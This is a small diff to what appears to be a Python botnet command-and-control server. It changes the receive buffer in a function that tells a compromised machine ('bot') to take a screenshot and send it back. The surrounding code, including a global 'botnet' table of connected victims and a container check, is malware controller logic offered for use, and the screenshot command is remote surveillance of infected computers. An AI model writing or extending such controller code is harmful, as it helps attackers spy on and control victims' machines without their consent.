@@ -110,7 +110,7 @@ def check_container(bot):
 def get_screenshot(addr):
     global botnet
     botnet[addr].send("screenshot".encode())
-    resp = botnet[addr].recv(1024000000)
+    resp = botnet[addr].recv(1024000)
     try:
         if(resp.decode() == "FAILED"):
             print("[*] Failed to get screenshot from %s"%(addr))
